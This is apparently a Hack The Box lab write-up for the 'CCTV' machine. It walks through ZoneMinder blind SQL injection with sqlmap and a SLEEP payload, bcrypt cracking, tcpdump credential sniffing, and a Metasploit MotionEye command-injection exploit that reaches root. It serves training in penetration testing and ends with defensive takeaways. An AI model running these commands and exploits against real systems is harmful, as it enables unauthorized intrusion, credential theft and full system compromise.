# HTB — CCTV Machine Writeup

**IP:** `$ip_target` | **Hostname:** `cctv.htb` | **OS:** Ubuntu 24.04 | **Difficulty:** Medium

---

---

## Attack Path Overview

```
Recon → ZoneMinder SQLi (CVE-2024-51482) → Hash Crack → SSH as mark
     → tcpdump credential sniff → su sa_mark
     → SSH tunnel → MotionEye RCE (CVE-2025-60787) → root
```

---

## 1. Reconnaissance

### Nmap

```bash
nmap -sC -sV -T4 -p- --open $ip_target
```

**Results:**

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 9.6p1 Ubuntu|
|80/tcp|HTTP|Apache 2.4.58|

- Hostname resolves to `cctv.htb`
- Web title: **SecureVision CCTV & Security Solutions**

```bash
echo "$ip_target cctv.htb" >> /etc/hosts
```

### Web Fingerprinting

Navigating to `http://cctv.htb` reveals a monitoring dashboard. The **Staff Login** link redirects to a **ZoneMinder v1.37.63** instance at `/zm/`.

> ZoneMinder is a known target due to its history of critical vulnerabilities in AJAX request handling.

---

## 2. Web Exploitation — CVE-2024-51482 (SQL Injection)

### Vulnerability Analysis

The file `web/ajax/event.php` fails to sanitize the `tid` parameter before using it in a secondary SQL query:

```php
$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId";
```

This results in a **Time-Based Blind SQL Injection** vulnerability.

**Vulnerable endpoint:**

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1
```

### Step 1 — Obtain Authenticated Session

ZoneMinder requires authentication. Login with default credentials (`admin:admin`) while handling the CSRF token:

```bash
# Get CSRF token and login
CSRF=$(curl -s -c cookies.txt "http://cctv.htb/zm/index.php?view=login" \
  | grep -oP '(?<=csrfMagicToken = ")[^"]+')

curl -s -b cookies.txt -c cookies.txt -X POST \
  "http://cctv.htb/zm/index.php?view=login" \
  -d "__csrf_magic=${CSRF}&action=login&username=admin&password=admin" \
  -L > /dev/null

# Extract session cookie
SESSION=$(grep ZMSESSID cookies.txt | awk '{print $NF}')
echo "Session: $SESSION"
```

### Step 2 — Create SQLmap Request File

```bash
cat > req.txt << EOF
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
User-Agent: Mozilla/5.0
Accept: */*
Cookie: ZMSESSID=${SESSION}; zmSkin=classic; zmCSS=base
Connection: close

EOF
```

### Step 3 — Dump Credentials with SQLmap

```bash
sqlmap -r req.txt --batch -p "tid" \
  --technique=T --time-sec=3 \
  --dbms=mysql \
  --dump -D zm -T Users -C Username,Password \
  --where="Username='mark'" \
  --threads=1
```

**Result:**

```
Database: zm
Table: Users
+----------+--------------------------------------------------------------+
| Username | Password                                                     |
+----------+--------------------------------------------------------------+
| mark     | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+----------+--------------------------------------------------------------+
```

> **Note:** Time-based blind SQLi on bcrypt hashes (60 chars) is slow. Expect 15–30 minutes. The injection was confirmed with payload: `tid=1 AND (SELECT 8166 FROM (SELECT(SLEEP(5)))pbHo)`

---

## 3. Hash Cracking

The hash type is **bcrypt** (`$2y$10$`) — hashcat mode `3200`.

```bash
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked:**

```
mark : opensesame
```

---

## 4. Initial Access — SSH as mark

```bash
ssh mark@cctv.htb
# Password: opensesame
```

---

## 5. Lateral Movement — Network Credential Sniffing

### Identify Docker Infrastructure

```bash
ip a
# Multiple br- and veth interfaces confirm containerized CCTV stack
```

### Capabilities Check

```bash
getcap -r / 2>/dev/null
# tcpdump has cap_net_raw — allows packet capture as non-root
```

### Sniff Internal Traffic

```bash
tcpdump -i any -nn -A tcp port 5000
```

Shortly after, an automated request from `172.25.0.11` to the Flask service at `172.25.0.10:5000` reveals **cleartext credentials**:

```
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
```

### Pivot to sa_mark

```bash
su - sa_mark
# Password: X1l9fx1ZjS7RZb
```

### User Flag

```bash
cat ~/user.txt
# <user_flag>
```

---

## 6. Privilege Escalation — MotionEye RCE (CVE-2025-60787)

### Service Discovery

In `sa_mark`'s home directory:

```bash
ls ~
# 'SecureVision Staff Announcement.pdf'  user.txt
```

The PDF mentions: _"Staff logins will remain the same"_ — hinting at **credential reuse**.

```bash
ss -tulnp
# Port 8765 is open locally — MotionEye web panel
```

### SSH Tunnel

From your Kali machine, forward port 8765:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
# Password: opensesame
```

Browse to `http://127.0.0.1:8765` — confirms **MotionEye v0.43.1b4**.

Login as `admin` with password `X1l9fx1ZjS7RZb` — **successful** (credential reuse confirmed).

### Vulnerability Analysis

MotionEye is vulnerable to **Command Injection** (CVE-2025-60787). Fields like `image_file_name` and `movie_filename` in camera configs are written directly to files parsed by the `motion` process without sanitization.

### Exploitation with Metasploit

```bash
msfconsole -q -x "
use exploit/linux/http/motioneye_auth_rce_cve_2025_60787;
set RHOSTS 127.0.0.1;
set RPORT 8765;
set PASSWORD X1l9fx1ZjS7RZb;
set LHOST tun0;
run"
```

**Output:**

```
[+] The target appears to be vulnerable. Detected version 0.43.1b4
[+] Camera successfully added
[+] Exploit triggered, waiting for session...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: root
```

### Root Flag

```bash
meterpreter > cat /root/root.txt
# <root_flag>
```

---

## 7. Vulnerabilities Summary

|CVE|Component|Type|Impact|
|---|---|---|---|
|CVE-2024-51482|ZoneMinder 1.37.63|Time-Based Blind SQLi|Credential Dump|
|CVE-2025-60787|MotionEye 0.43.1b4|Authenticated RCE|Root Shell|
|N/A|tcpdump cap_net_raw|Capability Misconfiguration|Credential Sniff|
|N/A|MotionEye admin panel|Credential Reuse|Auth Bypass|

---

## 8. Key Takeaways

- **Default credentials** (`admin:admin`) on ZoneMinder gave initial access to the SQLi endpoint.
- **Time-based blind SQLi** is slow but reliable — always use `--technique=T` with `--time-sec` tuned to network latency.
- **Docker bridge interfaces** with unencrypted internal service communication is a critical misconfiguration — always encrypt inter-container traffic.
- **`cap_net_raw` capability** on tcpdump allows non-root users to sniff all network traffic — dangerous in multi-tenant environments.
- **Credential reuse** across ZoneMinder → Flask service → MotionEye is a common pattern in HTB machines and real-world environments.

---

_Writeup by: Atrox | Date: March 8, 2026_